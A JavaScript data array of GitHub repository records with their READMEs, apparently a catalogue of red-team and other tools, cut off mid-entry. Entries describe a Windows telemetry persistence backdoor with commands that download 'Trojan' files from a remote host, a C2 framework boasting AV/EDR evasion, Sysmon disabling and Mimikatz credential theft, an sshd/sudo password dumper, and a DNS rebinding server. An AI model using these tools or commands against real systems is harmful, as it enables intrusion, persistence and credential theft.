const documents = [{"tags": ["windows", "redteam", "offensive", "Telemetry"], "owner": "360-Linton-Lab", "description": "WINDOWS TELEMETRY\u6743\u9650\u7ef4\u6301", "name": "Telemetry", "topics_string": "windows redteam offensive telemetry", "language": "C#", "readme": "\"# TELEMETRY\\n\\n\\n### Background\\n\\n[TELEMETRY](#TELEMETRY-1) is a C# For Windows PERSISTENCE\\n\\nToday we\\u2019re going to talk about a persistence method that takes advantage of some of the wonderful telemetry that Microsoft has included in Windows versions for the last decade. \\n\\n- **Local admin rights to install (requires the ability to write to HKLM)**\\n- **Have CompatTelRunner.exe**\\n- **2008R2/Windows 7 through 2019/Windows 10**\\n\\n### Advantage\\n\\n- **Using the system's own Telemetry planned tasks**\\n- **Only registry suspicious backdoor troubleshooting**\\n\\n### Command Line Usage\\n\\n ABUSING WINDOWS TELEMETRY FOR PERSISTENCE\\n .Imanfeng\\n Features:\\n Install: - Deployment authority maintains backdoor\\n \\n Command:\\n TELEMETRY.exe install /command:calc\\n - Execute command without file backdoor\\n \\n TELEMETRY.exe install /url:http://8.8.8.8/xxx.exe /path:C:\\\\Windows\\\\Temp\\\\check.exe\\n - Remotely download Trojan files to the specified directory for backdoor startup\\n \\n TELEMETRY.exe install /url:http://8.8.8.8/xxx.exe\\n - Remotely download Trojan files to C:\\\\\\\\Windows\\\\\\\\Temp\\\\\\\\compattelrun.exe for backdoor startup\\n \\n TELEMETRY.exe install /path:C:\\\\Windows\\\\Temp\\\\check.exe\\n - Set path Trojan files for backdoor startup\\n \\n Parameter:\\n /command: - Execute Command\\n /url: - Download FROM\\n /path: - Download To\\n\\n- Execute command without file backdoor\\n\\n ```\\n Telemetry.exe install /command:calc\\n ```\\n\\n ![1](PIC/2.png)\\n\\n \\n\\n- Remotely download Trojan files for backdoor startup\\n\\n ```\\n Telemetry.exe install /url:http://vps:8089/System.exe\\n ```\\n\\n ![2](PIC/1.png)\\n\\n \\n\\n### Learn\\n\\nhttps://www.trustedsec.com/blog/abusing-windows-telemetry-for-persistence/\\n\"", "topics": [], "writeup": "", "ignoredescription": false, "id": 0, "full_name": "360-Linton-Lab/Telemetry", "url": "https://github.com/360-Linton-Lab/Telemetry"},
{"tags": ["traffic-generator", "generation"], "owner": "alphasoc", "description": "A utility to generate malicious network traffic and evaluate controls", "name": "flightsim", "topics_string": "intrusion-detection monitoring security testing-tools traffic-generator generation", "language": "Go", "readme": "\"# Network Flight Simulator\\n\\n**flightsim** is a lightweight utility used to generate malicious network traffic and help security teams to evaluate security controls and network visibility. The tool performs tests to simulate DNS tunneling, DGA traffic, requests to known active C2 destinations, and other suspicious traffic patterns.\\n\\n## Installation\\n\\nDownload the latest flightsim binary for your OS from the [GitHub Releases](https://github.com/alphasoc/flightsim/releases) page. Alternatively, the utility can be built using [Golang](https://golang.org/doc/install) in any environment (e.g. Linux, MacOS, Windows), as follows:\\n\\n```\\ngo get -u github.com/alphasoc/flightsim/...\\n```\\n\\n## Running Network Flight Simulator\\n\\nUpon installation, test flightsim as follows:\\n\\n```\\n$ flightsim --help\\n\\nAlphaSOC Network Flight Simulator\\u2122 (https://github.com/alphasoc/flightsim)\\n\\nflightsim is an application which generates malicious network traffic for security\\nteams to evaluate security controls (e.g. firewalls) and ensure that monitoring tools\\nare able to detect malicious traffic.\\n\\nUsage:\\n flightsim <command> [arguments]\\n\\nAvailable Commands:\\n run Run all modules, or a particular module\\n version Prints the version number\\n\\nCheatsheet:\\n flightsim run Run all the modules\\n flightsim run c2 Simulate C2 traffic\\n flightsim run c2:trickbot Simulate C2 traffic for the TrickBot family\\n```\\n\\nThe utility runs individual modules to generate malicious traffic. To perform all available tests, simply use `flightsim run` which will generate traffic using the first available non-loopback network interface. **Note:** when running many modules, flightsim will gather destination addresses from the AlphaSOC API, so requires egress Internet access.\\n\\nTo list the available modules, use `flightsim run --help`. To execute a particular test, use `flightsim run <module>`, as below.\\n\\n```\\n$ flightsim run --help\\nusage: flightsim run [flags] [modules]\\n\\nTo run all available simulators, call:\\n\\n flightsim run\\n\\n To run a specific module:\\n\\n flightsim run c2\\n\\nAvailable modules:\\n\\n\\tc2, dga, miner, scan, sink, spambot, tunnel-dns, tunnel-icmp\\n\\nAvailable flags:\\n -dry\\n \\tprint actions without performing any network activity\\n -fast\\n \\treduce sleep intervals between simulation events\\n -iface string\\n \\tnetwork interface or local IP address to use\\n -size int\\n \\tnumber of hosts generated for each simulator\\n\\n$ flightsim run dga\\n\\nAlphaSOC Network Flight Simulator\\u2122 (https://github.com/alphasoc/flightsim)\\nThe IP address of the network interface is 172.20.10.2\\nThe current time is 23-Jan-20 11:33:21\\n\\n11:33:21 [dga] Generating a list of DGA domains\\n11:33:21 [dga] Resolving nurqatp.space\\n11:33:22 [dga] Resolving uahscqe.top\\n11:33:23 [dga] Resolving asimazf.biz\\n11:33:24 [dga] Resolving phxeohj.biz\\n11:33:25 [dga] Resolving crgwsoe.biz\\n11:33:26 [dga] Resolving sazafls.biz\\n11:33:27 [dga] Resolving gljyxdv.space\\n11:33:28 [dga] Resolving eiontgl.top\\n11:33:29 [dga] Resolving pqjseqc.top\\n11:33:30 [dga] Resolving mamsnmu.biz\\n11:33:31 [dga] Resolving ntettqn.top\\n11:33:32 [dga] Resolving niyvbvg.top\\n11:33:33 [dga] Resolving bxgqonb.biz\\n11:33:34 [dga] Resolving encggla.top\\n11:33:35 [dga] Resolving qphfoxn.biz\\n11:33:35 [dga] Done (15/15)\\n\\nAll done! Check your SIEM for alerts using the timestamps and details above.\\n```\\n\\n## Description of Modules\\n\\nThe modules packaged with the utility are listed in the table below.\\n\\n| Module | Description |\\n| ------------- | ----------------------------------------------------------------------------- |\\n| `c2` | Generates both DNS and IP traffic to a random list of known C2 destinations |\\n| `dga` | Simulates DGA traffic using random labels and top-level domains |\\n| `miner` | Generates Stratum mining protocol traffic to known cryptomining pools |\\n| `scan` | Performs a port scan of random RFC 5737 addresses using common TCP ports |\\n| `sink` | Connects to known sinkholed destinations run by security researchers |\\n| `spambot` | Resolves and connects to random Internet SMTP servers to simulate a spam bot |\\n| `tunnel-dns` | Generates DNS tunneling requests to \\\\*.sandbox.alphasoc.xyz |\\n| `tunnel-icmp` | Generates ICMP tunneling traffic to an Internet service operated by AlphaSOC |\\n\"", "topics": ["intrusion-detection", "monitoring", "security", "testing-tools"], "writeup": "flightsim is a lightweight utility used to generate malicious network traffic and help security teams to evaluate security controls and network visibility. The tool performs tests to simulate DNS tunneling, DGA traffic, requests to known active C2 destinations, and other suspicious traffic patterns.", "ignoredescription": false, "id": 1, "full_name": "alphasoc/flightsim", "url": "https://github.com/alphasoc/flightsim"},
{"tags": [], "owner": "ashemery", "description": "Offensive Software Exploitation Course", "name": "exploitation-course", "topics_string": "exploitation exploitation-course exploitdev offensive ose", "language": "Python", "readme": "\"# Offensive Software Exploitation (OSE) Course\\n\\nThis repository is for the Offensive Software Exploitation Course I am teaching at Champlain College and currently doing it for free online (check the YouTube channel for the recordings). Most of the slidenotes I used, are already shared on [HTID Course](http://opensecuritytraining.info/HTID.html), but the labs were fully created by myself. I used publically available resources and software to explain each of the weakneses covered, so there is nothing here that you cannot find online.\\n\\n---\\n### Vulnerable Software\\nThe vulnerable software I used are also online and can be found at [Exploit-db](https://www.exploit-db.com/). I also used Stephen Bradshaw's [VulnServer](https://github.com/stephenbradshaw/vulnserver), plus maybe some other simple code that I prepared. Please check each lab for the software used in that specific lab and from where to download it.\\n\\n---\\n### Tool(s) Required\\nAll of the tools used are free and could be downloaded from the URLs below.\\n- Immunity Debugger: [download](https://www.immunityinc.com/products/debugger/)\\n- Kali Linux: [download](https://www.kali.org/)\\n- CFF Explorer: [download](https://ntcore.com/?page_id=388)\\n- NetCat: [download](https://joncraton.org/blog/46/netcat-for-windows/)\\n- Others!\\n\\n---\\n### Target(s) Used\\n- Download a Windows 10 VM from Microsoft VMs (currently using Version 1809 Build 17763.1339) [here](https://developer.microsoft.com/en-us/microsoft-edge/tools/vms/). This will be used for most of the labs, except for the EggHunter lab, I used a Windows 7 VM, also from Microsoft VMs (currently offline so check archive.org).\\n- All the targeted software is Intel/AMD 32-bit unless otherwise instructed.\\n\\n---\\n### Table of Contents:\\nThe topics that will be covered in this course are:\\n1. The Basics (PE Format, DLLs, etc)\\n2. Bug Hunting and Fuzzing\\n3. Intro. to Memory Corruption and Buffer Overflows\\n4. Metasploit\\n5. Mitigation Techniques\\n6. SEH and Jumping Strategies\\n7. Egghunter\\n8. Retrurn Oriented Programming (ROP)\\n9. Post Exploitation\\n10. Manual Code Injection\\n\\n---\\n### Video Recordings:\\n- Arabic version: [Playlist](https://www.youtube.com/playlist?list=PLCS2zI95IiNyo5AhbVIL2hVX7zhuSkOkz)\\n- English version: [Playlist](https://www.youtube.com/playlist?list=PLCS2zI95IiNybAAQ0HL88YzwRpLXje5y6)\\n\\n---\\n### Useful Resources:\\n- The number one resource is the Corelan Team's blog, [Corelan Team](https://www.corelan.be/)\\n\\n---\\n### Update(s):\\n- On Aug. 6th, 2020 both [eLearnSecurity](https://www.elearnsecurity.com/) and [INE](https://www.ine.com/) decided to sponsor the English version of the course and therefore will be recording an English version too.\\n\\n### Credits:\\nThanks to everyone who shared their work online, without them this course would not have happened!\\n\\n\\n\"", "topics": ["exploitation", "exploitation-course", "exploitdev", "offensive", "ose"], "writeup": "", "ignoredescription": false, "id": 2, "full_name": "ashemery/exploitation-course", "url": "https://github.com/ashemery/exploitation-course"},
{"tags": [], "owner": "bats3c", "description": "A post exploitation framework designed to operate covertly on heavily monitored environments", "name": "shad0w", "topics_string": "c c2 docker dotnet red-team shad0w shellcode", "language": "C", "readme": "\"[![Project Status](https://img.shields.io/badge/status-BETA-yellow?style=flat-square)]()\\n\\n# SHAD0W\\n\\n<p align=\\\"center\\\">\\n <img alt=\\\"shad0w logo\\\" src=\\\"shad0w.png\\\" />\\n</p>\\n\\nSHAD0W is a modular C2 framework designed to successfully operate on mature environments.\\n\\nIt will use a range of methods to evade EDR and AV while allowing the operator to continue using tooling an tradecraft they are familiar with. Its powered by Python 3.8 and C, using [Donut](https://github.com/TheWover/donut) for payload generation. By using Donut along side the process injection capabilities of SHAD0W it gives the operator the ability to execute .NET assemblies, EXEs, DLLs, VBS, JS or XSLs fully inside memory. Dynamically resolved syscalls are heavily used to avoid userland API hooking, anti DLL injection to make it harder for EDR to load code into the beacons and offical microsoft mitigation methods to protect spawn processes.\\n\\nMain features of the SHAD0W C2 are:\\n\\n- **Built For Docker** - It runs fully inside docker allowing cross platform usage\\n- **Live Proxy & Mirror** - The C2 server is able to mirror any website in real time, relaying all non C2 traffic to that site making it look less subject when viewed in a web browser\\n- **HTTPS C2 Communication** - All traffic between beacons and the C2 will be encrypted and transmitted over HTTPS\\n- **Modern CLI** - The CLI is built on [prompt-toolkit](https://github.com/prompt-toolkit/python-prompt-toolkit)\\n- **JSON Based Protocol** - Custom beaons are able to built and used easily with an easy to implement protocol\\n- **Extremely Modular** - Easy to create new modules to interact and task beacons\\n\\nMain features of SHAD0W beacons are:\\n\\n- **Shellcode, EXE, Powershell & More** - Beacons can be generated and used in many different formats\\n- **Process Injection** - Allowing you to `migrate`, `shinject`, `dllinject` and more\\n- **Bypass AV** - Payloads are frequently updated to evade common Anti-Virus products\\n- **Highly configurable** - Custom jitters, user agents and more\\n- **Proxy Aware** - All callbacks will use the current system proxy\\n- **HTTPS C2 Communication** - Traffic to and from the C2 is encrypted via HTTPS\\n\\nCurrent Modules:\\n\\n- **GhostPack** - With the binarys compiled nightly via an Azure pipeline. Thanks to [@Flangvik](https://twitter.com/Flangvik)\\n- **Unmanaged Powershell** - With built in AMSI bypass\\n- **Ghost In The Logs** - Disable ETW & Sysmon, more info can be found [here](https://blog.dylan.codes/evading-sysmon-and-windows-event-logging/)\\n- **Elevate** - Built in PrivEsc exploits\\n- **SharpSocks** - Reverse socks proxy over HTTPS\\n- **SharpCollection** - A ton of .NET offensive tools, more info can be found [here](https://github.com/Flangvik/SharpCollection)\\n- **Mimikatz** - For all your credential theft needs\\n- **Upload & Download** - Easy data exfiltration\\n- **StdAPI** - Common commands to interact with the file system\\n\\n## Install\\n\\n $ git clone --recurse-submodules https://github.com/bats3c/shad0w.git && cd shad0w\\n $ sudo ./shad0w install\\n\\n## Usage\\n\\nhttps://labs.jumpsec.com/2020/06/03/shad0w/\\n\\n## Official Discord\\n\\n[![Porchetta Industries](https://discordapp.com/api/guilds/736724457258745996/widget.png?style=banner3)](https://discord.gg/ycXRvcD)\"", "topics": ["c", "c2", "docker", "dotnet", "red-team", "shad0w", "shellcode"], "writeup": "SHAD0W is a modular C2 framework designed to successfully operate on mature environments. Supports JSON Based Protocol - Custom beaons are able to built and used easily with an easy to implement protocol It will use a range of methods to evade EDR and AV while allowing the operator to continue using tooling an tradecraft they are familiar with. Its powered by Python 3.8 and C, using Donut for payload generation. By using Donut along side the process injection capabilities of SHAD0W it gives the operator the ability to execute .NET assemblies, EXEs, DLLs, VBS, JS or XSLs fully inside memory. Dynamically resolved syscalls are heavily used to avoid userland API hooking, anti DLL injection to make it harder for EDR to load code into the beacons and offical microsoft mitigation methods to protect spawn processes.\n", "ignoredescription": false, "id": 3, "full_name": "bats3c/shad0w", "url": "https://github.com/bats3c/shad0w"},
{"tags": [], "owner": "bbc", "description": "Wraith \u2014 A responsive screenshot comparison tool", "name": "wraith", "topics_string": "", "language": "Ruby", "readme": "\"![Wraith logo](https://raw.githubusercontent.com/BBC-News/wraith/master/assets/wraith-logo.png)\\n\\n[![build status](https://secure.travis-ci.org/BBC-News/wraith.png?branch=master)](http://travis-ci.org/BBC-News/wraith)\\n[![rubygems version](https://img.shields.io/gem/v/wraith.svg)](https://rubygems.org/gems/wraith)\\n[![codeclimate report](https://codeclimate.com/github/BBC-News/wraith.png)](https://codeclimate.com/github/BBC-News/wraith)\\n\\nWraith is a screenshot comparison tool, created by developers at BBC News.\\n\\n[Documentation](http://bbc-news.github.io/wraith/) \\u2022 [Source](http://github.com/bbc-news/wraith) \\u2022 [Responsive News Website](http://responsivenews.co.uk)\\n\\n## What is it?\\n\\nWraith uses a headless browser to create screenshots of webpages on different environments (or at different moments in time) and then creates a diff of the two images; the affected areas are highlighted in blue.\\n\\n![Photo of BBC News with a diff](http://bbc-news.github.io/wraith/img/wraith.png)\\n\\n## Documentation\\n\\nFor instructions on how to install, set up and use Wraith and all of its features, [visit the Wraith documentation](http://bbc-news.github.io/wraith/index.html).\\n\\nA brief overview of how Wraith works is provided below.\\n\\n## Wraith modes\\n\\nThere are several ways in which Wraith can be used:\\n\\n1. Comparison of 2 domains (`wraith capture`). There are also some specialist options within this mode:\\n * Spidering 2 domains for changes (`wraith capture` when no `paths` property is provided in the configuration file)\\n * Running several comparisons at once (`wraith multi_capture`)\\n2. Comparing the same domain over time (`wraith history`, then `wraith latest`)\\n\\nWhichever mode you decide to run Wraith in, the process it follows is generally the same:\\n\\n* takes screenshots of your webpages\\n* runs a comparison task across them\\n* outputs a diff PNG file comparing the two images, and a data.txt file which contains the percentage of pixels that have changed\\n* packages all of this up into a gallery.html, ready for you to view\\n* if any screenshot's diff is above the threshold you specified in your configuration file, the task exits with a system error code (useful for CI)\\n* the failed screenshot will also be highlighted in the gallery\\n\\n## Requirements\\n\\n[ImageMagick](http://www.imagemagick.org/) is required to compare the screenshots and crop images.\\n\\nWraith also requires at least one of these headless browsers:\\n\\n* [PhantomJS](http://phantomjs.org)\\n* [CasperJS](http://casperjs.org/) (which can be used to target specific selectors)\\n* [SlimerJS](http://slimerjs.org)\\n* [Chrome](https://askubuntu.com/questions/510056/how-to-install-google-chrome/510063) (Currently using Selenium WebDriver + Chromedriver for Chrome; Can target specific selectors)\\n\\n## Contributing\\n\\nPlease read [how to contribute to Wraith](https://github.com/BBC-News/wraith/blob/master/.github/CONTRIBUTING.md).\\n\\n## License\\n\\nWraith is available to everyone under the terms of the Apache 2.0 open source license. [Take a look at Wraith's LICENSE file](https://github.com/BBC-News/wraith/blob/master/LICENSE).\\n\\n## Credits\\n\\n * [Dave Blooman](https://twitter.com/dblooman)\\n * [John Cleveley](https://twitter.com/jcleveley)\\n * [Simon Thulbourn](https://twitter.com/sthulb)\\n * [Chris Ashton](https://twitter.com/chrisbashton)\\n\\n## Selenium-Wraith\\n\\nAnyone interested in integrating selenium capability with Wraith should check out [Selenium-Wraith](https://github.com/mathew-hall/wraith-selenium) (maintained by Mathew Hall), which was forked from BBC's Wraith on 16/04/14 and adds the following capabilities:\\n\\n1. Selenium integration, both running locally on a desktop or on a selenium grid\\n2. Browser to browser screenshot comparison\\n3. Page component-based comparison\\n\"", "topics": [], "writeup": "Wraith uses a headless browser to create screenshots of webpages on different environments (or at different moments in time) and then creates a diff of the two images; the affected areas are highlighted in blue.", "ignoredescription": false, "id": 4, "full_name": "bbc/wraith", "url": "https://github.com/bbc/wraith"},
{"tags": ["redteam", "linx", "credentials", "sshd"], "owner": "blendin", "description": "Tool for extracting information from newly spawned processes", "name": "3snake", "topics_string": "redteam linx credentials sshd", "language": "C", "readme": "\"3snake - dump sshd and sudo credential related strings\\n---\\n\\nAbout\\n---\\nTargeting rooted servers, reads memory from `sshd` and `sudo` system calls that handle password based authentication. Doesn't write any memory to the traced processes. Spawns a new process for every `sshd` and `sudo` command that is run.\\n\\nListens for the `proc` event using netlink sockets to get candidate processes to trace. When it receives an `sshd` or `sudo` process `ptrace` is attached and traces `read` and `write` system calls, extracting strings related to password based authentication.\\n\\nDon't really like the solution of backdooring openssh or installing a kernel module on target servers so I made this.\\n\\n![3snake](https://user-images.githubusercontent.com/20363764/35941544-74b2d22c-0c07-11e8-887a-474cb9b6daec.gif)\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\nBuild\\n---\\n```sh\\nmake\\n./3snake -h\\n./3snake\\n```\\n\\n\\n\\n\\n\\nUsage\\n---\\n\\nRun in current terminal\\n`./3snake`\\n\\nDaemonize and dump output to file\\n`./3snake -d -o \\\"/tmp/output_file.txt\\\"`\\n\\nConfiguration\\n---\\nLocated in [config.h](https://github.com/blendin/3snake/blob/master/src/config.h) \\n- __ROOT_DIR__ - root directory when daemonized (relative file paths for -o option will end up here) \\n- __ENABLE_SSH__ - OpenSSH server password auth\\n- __ENABLE_SUDO__ - sudo password auth\\n- __ENABLE_SU__ (experimental) - su password auth\\n- __ENABLE_SSH_CLIENT__ (experimental) - ssh client password auth\\n\\nLimitations\\n---\\nLinux, ptrace enabled, /proc filesystem mounted\\n\\n\\nTodo\\n---\\n\\n| Features | X |\\n|---------------------------------------------------|-----|\\n| OpenSSH server password auth | X |\\n| sudo | X |\\n| su | X |\\n| regex strings from processes | ~ |\\n| ssh client | X |\\n\\n* Make the process of adding tracers more fluid\\n* Yubikey: Ask for second yubikey from end users, OpenSSH\\n* Output mode that only shows usernames/passwords\\n\\nLicense\\n---\\nMIT\\n\"", "topics": [], "writeup": "Targeting rooted servers, reads memory from sshd and sudo system calls that handle password based authentication. Doesn't write any memory to the traced processes. Spawns a new process for every sshd and sudo command that is run. Listens for the proc event using netlink sockets to get candidate processes to trace. When it receives an sshd or sudo process ptrace is attached and traces read and write system calls, extracting strings related to password based authentication. Don't really like the solution of backdooring openssh or installing a kernel module on target servers so I made this.\n", "ignoredescription": false, "id": 5, "full_name": "blendin/3snake", "url": "https://github.com/blendin/3snake"},
{"tags": ["redteam", "infra"], "owner": "brannondorsey", "description": "A \"malicious\" DNS server for executing DNS Rebinding attacks on the fly (public instance running on rebind.network:53)", "name": "whonow", "topics_string": "dns dns-rebinding dns-server hacking malicious-domains nodejs penetration-testing red-team redteam infra", "language": "JavaScript", "readme": "\"# Whonow DNS Server\\n\\nA malicious DNS server for executing [DNS Rebinding attacks](https://en.wikipedia.org/wiki/DNS_rebinding) on the fly. `whonow` lets you specify DNS responses and rebind rules dynamically *using domain requests themselves*.\\n\\n```bash\\n# respond to DNS queries for this domain with 34.192.228.43 the first time\\n# it is requested and then 192.168.1.1 every time after that\\nA.34.192.228.43.1time.192.168.1.1.forever.rebind.network\\n\\n# respond first with 34.192.228.43, then 192.168.1.1 the next five times,\\n# and then start all over again (1, then 5, forever...)\\nA.34.192.228.43.1time.192.168.1.1.5times.repeat.rebind.network\\n```\\n\\nWhat's great about dynamic DNS Rebinding rules is that you don't have to spin up your own malicious DNS server to start exploiting the browser's [Same-origin policy](https://en.wikipedia.org/wiki/Same-origin_policy). Instead, everyone can share the same public `whonow` server running on port 53 of `rebind.network`.\\n\\n**Note**: You should include UUIDs (e.g. `a06a5856-1fff-4415-9aa2-823230b05826\\n`) as a subdomain in each DNS lookup to a `whonow` server. These have been omitted from examples in this README for brevity, but assume requests to `*.rebind.network` should be `*.a06a5856-1fff-4415-9aa2-823230b05826.rebind.network`. See the [Gotchas](#gotchas) section for more info as to why.\\n\\n**DISCLAIMER: This software is for educational purposes only. This software should not be used for illegal activity. The author is not responsible for its use. Don't be a dick.**\\n\\n## Subdomains = Rebind Rules\\n\\nThe beauty of `whonow` is that you can define the behavior of DNS responses via subdomains in the domain name itself. Using only a few simple keywords: `A`, `(n)times`, `forever`, and `repeat`, you can define complex and powerful DNS behavior.\\n\\n### Anatomy of a `whonow` request\\n\\n```\\nA.<ip-address>.<rule>[.<ip-address>.<rule>[.<ip-address>.<rule>]][.uuid/random-string].example.com\\n```\\n\\n- `A`: The type of DNS request. Currently only `A` records are supported, but `AAAA` should be coming soon.\\n- `<ip-address>`: an ipv4 (ipv6 coming soon) address with each octet seprated by a period (e.g. `192.168.1.1`.\\n- `<rule>`: One of three rules\\n\\t- `(n)time[s]`: The number of times the DNS server should reply with the previous IP address. Accepts both plural and singular strings (e.g. `1time, 3times, 5000times`)\\n\\t- `forever`: Respond with the previous IP address forever.\\n\\t- `repeat`: Repeat the entire set of rules starting from the beginning.\\n- `[uuid/random-string]`: A random string to keep DNS Rebind attacks against the same IP addresses separate from each other. See [Gotchas](#gotchas) for more info.\\n- `example.com`: A domain name you have pointing to a `whonow` nameserver, like the publicly available `rebind.network:53` `whonow` instance.\\n\\nRules can be chained together to form complex response behavior.\\n\\n### Examples\\n\\n```\\n# always respond with 192.168.1.1. This isn't really DNS rebinding\\n# but it still works\\nA.192.168.1.1.forever.rebind.network\\n\\n# alternate between localhost and 10.0.0.1 forever\\nA.127.0.0.1.1time.10.0.0.1.1time.repeat.rebind.network\\n\\n# first respond with 192.168.1.1 then 192.168.1.2. Now respond 192.168.1.3 forever.\\nA.192.168.1.1.1time.192.168.1.2.2times.192.168.1.3.forever.rebind.network\\n\\n# respond with 34.192.228.43 the first time, then whatever `whonow --default-address`\\n# is set to forever after that (default: 127.0.0.1)\\nA.34.192.228.43.1time.rebind.network\\n```\\n\\n### Limitations\\n\\n> Each label [subdomain] may contain zero to 63 characters... The full domain name may not exceed the length of 253 characters in its textual representation. (from the [DNS Wikipedia page](https://en.wikipedia.org/wiki/Domain_Name_System))\\n\\nAdditionally, there may not be more than 127 labels/subdomains.\\n\\n## Gotchas\\n\\n### Use Unique Domain Names\\n\\nEach unique domain name request to `whonow` creates a small state-saving program in the server's RAM. The next time that domain name is requested the program counter increments and the state may be mutated. **All unique domain names are their own unique program instances**. To avoid clashing with other users or having your domain name program's state inadvertently incremented you should add a UUID subdomain after your rule definitions. That UUID should never be reused.\\n\\n```\\n# this\\nA.127.0.0.1.1time.10.0.0.1.1time.repeat.8f058b82-4c39-4dfe-91f7-9b07bcd7fbd4.rebind.network\\n\\n# not this\\nA.127.0.0.1.1time.10.0.0.1.1time.repeat.rebind.network\\n```\\n\\n### `--max-ram-domains`\\n\\nThe program state associated with each unique domain name is stored by `whonow` in RAM. To avoid running out of RAM an upper-bound is placed on the number of unique domains who's program state can be managed at the same time. By default, this value is set to 10,000,000, but can be configured with the `--max-ram-domains`. Once this limit is reached, domain names and their saved program state will be removed in the order they were added (FIFO).\\n\\n## Running your own `whonow` server\\n\\nTo run your own `whonow` server in the cloud use your domain name provider's admin panel to configure a custom nameserver pointing to your VPS. Then install `whonow` on that VPS and make sure it's running on port 53 (the default DNS port) and that port 53 is accessible to the Internet.\\n\\n```bash\\n# install\\nnpm install --cli -g whonow@latest\\n\\n# run it!\\nwhonow --port 53\\n\\n# you can also run it with more logging to stdout and save DNS activity to CSV\\nwhonow --port 53 --logfile log.csv --verbose\\n```\\n\\n![whonow screenshot](.images/screenshot.png)\\n\\nIf that \\u261d is too much trouble, feel free to just use the public `whonow` server running on port 53 of `rebind.network`.\\ud83c\\udf10.\\n\\n## Usage\\n\\n```\\n$ whonow --help\\nusage: whonow [-h] [-v] [-p PORT] [-d DEFAULT_ANSWER] [-b MAX_RAM_DOMAINS]\\n [-l LOGFILE] [-m]\\n \\n\\nA malicious DNS server for executing DNS Rebinding attacks on the fly.\\n\\nOptional arguments:\\n -h, --help Show this help message and exit.\\n -v, --version Show program's version number and exit.\\n -p PORT, --port PORT What port to run the DNS server on (default: 53).\\n -d DEFAULT_ANSWER, --default-answer DEFAULT_ANSWER\\n The default IP address to respond with if no rule is \\n found (default: \\\"127.0.0.1\\\").\\n -b MAX_RAM_DOMAINS, --max-ram-domains MAX_RAM_DOMAINS\\n The number of domain name records to store in RAM at \\n once. Once the number of unique domain names queried \\n surpasses this number domains will be removed from \\n memory in the order they were requested. Domains that \\n have been removed in this way will have their program \\n state reset the next time they are queried (default: \\n 10000000).\\n -l LOGFILE, --logfile LOGFILE\\n Log to CSV file (default: false)\\n -m, --verbose Log request timestamp and sender IP address to stdout \\n (default: false)\\n```\\n\\n## Testing\\n\\nA `whonow` server must be running on `localhost:15353` to perform the tests in `test.js`\\n\\n```bash\\n# in one terminal\\nwhonow -p 15353\\n```\\n\\n```bash\\n# in another terminal\\ncd path/to/node_modules/whonow\\nnpm test\\n```\\n\"", "topics": ["dns", "dns-rebinding", "dns-server", "hacking", "malicious-domains", "nodejs", "penetration-testing", "red-team"], "writeup": "", "ignoredescription": false, "id": 6, "full_name": "brannondorsey/whonow", "url": "https://github.com/brannondorsey/whonow"},
{"tags": [], "owner": "capnspacehook", "description": "An intuitive and encrypted in-memory filesystem (VFS)", "name": "pandorasbox", "topics_string": "cryptography filesystem golang information-security infosec vfs virtual-file-system", "language": "Go", "readme": "\"# Pandoras Box\\n\\n[![GoDoc](https://godoc.org/github.com/capnspacehook/pandorasbox?status.svg)](https://godoc.org/github.com/capnspacehook/pandorasbox)\\n\\n`pandorasbox` is a Go package that allows for simple use of both a host's filesystem, and a virtual filesystem.\\n\\nThe design goal of Pandora's Box is to easily facilitate the use of a transparently-encrypted VFS (virtual filesystem), and the host's filesystem. It does this by providing functions and methods that operate and look the same as the Go standard library `os` package. If you want to interact with the VFS, pass in a path that starts with `vfs://`, and Pandora's Box will automatically use the VFS. Otherwise, the host's filesystem will be used.\\n\\n## Using Pandora's Box\\n\\nBecause Pandora's Box has the same interface as the `os` package, giving your code access to a VFS is often as easy as importing `pandorasbox` and replacing `os` calls to `box` calls. Take this super simple function that copies files: \\n\\n```go\\nimport \\\"os\\\"\\n\\nfunc CopyFile(srcFile, dstFile string) error {\\n out, err := os.Create(dstFile)\\n defer out.Close()\\n if err != nil {\\n return err\\n }\\n\\n in, err := os.Open(srcFile)\\n defer in.Close()\\n if err != nil {\\n return err\\n }\\n\\n _, err = io.Copy(out, in)\\n if err != nil {\\n return err\\n }\\n\\n return nil\\n}\\n```\\n\\nAll it takes to make this function VFS-friendly is switching from using `os` to `pandorasbox`:\\n\\n```go\\nimport box \\\"github.com/capnspacehook/pandorasbox\\\"\\n\\nfunc init() {\\n box.InitGlobalBox()\\n}\\n\\nfunc CopyFile(srcFile, dstFile string) error {\\n out, err := box.Create(dstFile)\\n if err != nil {\\n return err\\n }\\n defer out.Close()\\n\\n in, err := box.Open(srcFile)\\n if err != nil {\\n return err\\n }\\n defer in.Close()\\n\\n _, err = io.Copy(out, in)\\n if err != nil {\\n return err\\n }\\n\\n return nil\\n}\\n```\\n\\n### Global vs. Local VFS\\n\\nYou probably noticed the call to `box.InitGlobalBox()` in the last example. This has to be called **before** the global VFS can be used. \\nFor ease of use, Pandora's box provides a global `Box` that is easily accessible, but in some cases a local `Box` may be desired. If you don't wish to use the global `Box`, don't call `box.InitGlobalBox()`, instead create a locally scoped `Box` by calling `box.NewBox()`. This allows you to easily pass a `Box` into functions or methods or embed a `Box` in a struct.\\n\\n### `io/ioutil` and `path/filepath` Functions\\n\\nPandora's Box also provides helper functions that are identical to functions from `io/ioutil` and `path/filepath`. These should be used of the Go standard library packages when using a `Box`. The Pandora's Box versions are VFS-friendly, and will work seamlessly with a VFS, while the Go standard library packages will not. If you're using the global `Box`, the `io/ioutil` functions can be called from the main import: `github.com/capnspacehook/pandorasbox`. If you're using a local `Box`, you'll need to import `github.com/capnspacehook/pandorasbox/ioutil` and pass in your `Box` to those functions.\\n\\nExample (error handling omitted):\\n\\n```go \\nimport (\\n box \\\"github.com/capnspacehook/pandorasbox\\\"\\n \\\"github.com/capnspacehook/pandorasbox/ioutil\\\"\\n)\\n\\nfunc init() {\\n box.InitGlobalBox()\\n}\\n\\nfunc WriteFileGlobalBox() {\\n box.WriteFile(\\\"vfs://file.txt\\\", []byte(\\\"Testing testing 1 2 3\\\"), 0644)\\n data, _ := box.ReadFile(\\\"vfs://file.txt\\\")\\n fmt.Println(string(data))\\n}\\n\\nfunc WriteFileLocalBox() {\\n myBox := box.NewBox()\\n\\n ioutil.WriteFile(myBox, \\\"vfs://file.txt\\\", []byte(\\\"Testing testing 1 2 3\\\"), 0644)\\n data, _ := ioutil.ReadFile(myBox, \\\"vfs://file.txt\\\")\\n fmt.Println(string(data))\\n}\\n```\\n\\n### Forcing use of Host FS/VFS\\n\\nIf for some reason you need to force the usage of either the host's filesystem or the 